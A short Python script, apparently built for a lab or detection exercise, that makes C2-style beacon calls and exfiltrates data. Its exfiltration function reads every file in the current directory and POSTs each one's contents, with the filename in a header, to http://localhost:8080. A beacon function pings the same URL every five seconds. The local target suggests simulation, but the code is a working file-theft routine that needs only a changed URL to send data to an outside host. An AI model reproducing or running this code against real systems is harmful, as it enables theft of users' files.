import os
import requests
import time
from os.path import isfile, join

## Send out beacons for 60secs at 5secs interval
def beacon():
    start_time = time.time()
    url = 'http://localhost:8080'
    while True:
        requests.get(url=url)
        if (time.time() - start_time) > 60:
            break
        time.sleep(5)

def exfiltration():
    ## Getting list of files in current directory
    # files = [f for f in os.listdir('.') if f.isfile]

    for f in os.listdir('.'):
        if isfile(join('.', f)):
            print(f)
            ## wb enables to read bianry
            content = open(f,"rb").read()
            
            ## Sending out data
            url = 'http://localhost:8080'
            custom_headers = {'filename':f}
            r = requests.post(url = url, headers = custom_headers, data = content)

def main():
    exfiltration()
    # beacon()
    
if __name__=="__main__":
    main()